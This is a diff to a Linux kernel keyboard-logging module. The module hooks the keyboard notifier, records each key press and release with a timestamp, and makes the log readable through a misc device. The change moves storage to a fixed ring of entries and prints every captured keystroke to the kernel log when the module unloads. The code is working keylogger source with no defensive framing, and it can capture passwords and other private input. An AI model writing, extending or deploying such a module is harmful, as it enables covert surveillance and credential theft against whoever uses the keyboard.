@@ -8,7 +8,6 @@
 #include <linux/input.h>
 #include <linux/slab.h>
 
-#define BUF_SIZE 4096 /* 16 Kb */
 #define IGNORE_REPEAT
 // #define IGNORE_REPEAT_TIMESTAMP
 
@@ -138,9 +137,12 @@ KeyMap key_table[] = {
 };
 
 
-static char log_buffer[BUF_SIZE];
-static size_t log_start = 0;
-static size_t log_end = 0;
+#define MAX_LOG_ENTRIES 512
+#define MAX_LOG_LEN 128
+
+static char log_entries[MAX_LOG_ENTRIES][MAX_LOG_LEN];
+static int log_start = 0;
+static int log_count = 0;
 static DEFINE_MUTEX(log_lock);
 
 static int key_event_notifier(struct notifier_block *nb, unsigned long action, void *data);
@@ -164,7 +166,7 @@ static struct miscdevice keyboard_misc_device = {
 static int key_event_notifier(struct notifier_block *nb, unsigned long action, void *data)
 {
     struct keyboard_notifier_param *param = data;
-    char entry[128];
+    char entry[MAX_LOG_LEN];
     int len;
 
     if (action == KBD_KEYCODE)
@@ -181,19 +183,24 @@ static int key_event_notifier(struct notifier_block *nb, unsigned long action, v
                        param->down ? "Pressed" : "Released");
 
         mutex_lock(&log_lock);
+
+        int current_index = (log_start + log_count) % MAX_LOG_ENTRIES;
+
 #ifdef IGNORE_REPEAT
         /* Will ignore the same key press event */
         size_t timestamp_len = 8;
 
-        if (log_end >= len && memcmp(log_buffer + log_end - len + timestamp_len,
-                                     entry + timestamp_len, len - timestamp_len) == 0)
+        if ((log_count > 0) && (current_index > 0) &&\
+            memcmp(log_entries[current_index - 1] + timestamp_len,\
+            entry + timestamp_len, len - timestamp_len) == 0)
         {
             mutex_unlock(&log_lock);
             return NOTIFY_OK;
         }
 #elif defined(IGNORE_REPEAT_TIMESTAMP)
         /* Will accept the same key press event if it is repeated within the same second */
-        if (log_end >= len && memcmp(log_buffer + log_end - len, entry, len) == 0)
+        if ((log_count > 0) && (current_index > 0) &&\
+            memcmp(log_entries[current_index - 1], entry, len) == 0)
         {
             mutex_unlock(&log_lock);
             return NOTIFY_OK;
@@ -202,25 +209,16 @@ static int key_event_notifier(struct notifier_block *nb, unsigned long action, v
         /* Will accept the same key press event */
 #endif
 
-        while ((log_end + len) % BUF_SIZE == log_start)
-        {
-            size_t first_entry_len = strnlen(log_buffer + log_start, BUF_SIZE - log_start) + 1;
-            log_start = (log_start + first_entry_len) % BUF_SIZE;
-        }
+        strncpy(log_entries[current_index], entry, MAX_LOG_LEN - 1);
+        log_entries[current_index][MAX_LOG_LEN - 1] = '\0';
 
-        if (len <= BUF_SIZE)
+        if (log_count < MAX_LOG_ENTRIES)
         {
-            if (log_end + len <= BUF_SIZE)
-            {
-                memcpy(log_buffer + log_end, entry, len);
-            }
-            else
-            {
-                size_t first_chunk = BUF_SIZE - log_end;
-                memcpy(log_buffer + log_end, entry, first_chunk);
-                memcpy(log_buffer, entry + first_chunk, len - first_chunk);
-            }
-            log_end = (log_end + len) % BUF_SIZE;
+            log_count++;
+        }
+        else
+        {
+            log_start = (log_start + 1) % MAX_LOG_ENTRIES;
         }
 
         mutex_unlock(&log_lock);
@@ -232,42 +230,41 @@ static int key_event_notifier(struct notifier_block *nb, unsigned long action, v
 static ssize_t keyboard_read(struct file *file, char __user *buf, size_t count, loff_t *ppos)
 {
     ssize_t ret = 0;
+    int log_index = *ppos;
+    int i;
 
     mutex_lock(&log_lock);
 
-    if (log_start != log_end)
+    if (log_index >= log_count)
     {
-        size_t available_data;
-
-        if (log_start < log_end)
-            available_data = log_end - log_start;
-        else
-            available_data = BUF_SIZE - log_start + log_end;
-
-        ret = min(count, available_data);
-
-        if (log_start + ret <= BUF_SIZE)
-        {
-            if (copy_to_user(buf, log_buffer + log_start, ret))
-                ret = -EFAULT;
-        }
-        else
-        {
-            size_t first_chunk = BUF_SIZE - log_start;
-            if (copy_to_user(buf, log_buffer + log_start, first_chunk) ||
-                copy_to_user(buf + first_chunk, log_buffer, ret - first_chunk))
-            {
-                ret = -EFAULT;
-            }
-        }
-
-        if (ret > 0)
-            log_start = (log_start + ret) % BUF_SIZE;
-
-        *ppos += ret;
+        mutex_unlock(&log_lock);
+        return 0;
     }
 
+    for (i = log_index; i < log_count && count > 0; i++)
+    {
+        int index = (log_start + i) % MAX_LOG_ENTRIES;
+        const char *current_log = log_entries[index];
+        size_t log_len = strlen(current_log);
+
+        if (log_len > count)
+        {
+            break;
+        }
+
+        if (copy_to_user(buf + ret, current_log, log_len))
+        {
+            ret = -EFAULT;
+            break;
+        }
+
+        ret += log_len;
+        count -= log_len;
+    }
+
+    *ppos = i;
     mutex_unlock(&log_lock);
+
     return ret;
 }
 
@@ -288,39 +285,24 @@ static int __init keyboard_init(void)
 
 static void keyboard_exit(void)
 {
-    // struct file *file;
-    // mm_segment_t old_fs;
-    // loff_t pos = 0;
-    // ssize_t ret;
+    int i;
 
-    // // Open the file for writing
-    // file = filp_open("/tmp/keys_logs.txt", O_WRONLY | O_CREAT | O_TRUNC, 0644);
-    // if (IS_ERR(file)) {
-    //     pr_err("Failed to open /tmp/keys_logs.txt\n");
-    //     return;
-    // }
+    pr_info("=== Keyboard Logger: Final Logs ===\n");
 
-    // // Change the address limit to allow kernel access to user space
-    // old_fs = get_fs();
-    // set_fs(KERNEL_DS);
+    mutex_lock(&log_lock);
 
-    // // Write the log buffer to the file
-    // mutex_lock(&log_lock);
-    // ret = kernel_write(file, log_buffer, log_index, &pos);
-    // mutex_unlock(&log_lock);
+    for (i = 0; i < log_count; i++)
+    {
+        int index = (log_start + i) % MAX_LOG_ENTRIES;
+        pr_info("%s", log_entries[index]);
+    }
 
-    // if (ret < 0) {
-    //     pr_err("Failed to write to /tmp/keys_logs.txt\n");
-    // }
-
-    // // Restore the address limit
-    // set_fs(old_fs);
-
-    // // Close the file
-    // filp_close(file, NULL);
+    mutex_unlock(&log_lock);
 
     unregister_keyboard_notifier(&nb);
     misc_deregister(&keyboard_misc_device);
+
+    pr_info("Keyboard logger unloaded successfully.\n");
 }
 
 module_init(keyboard_init);
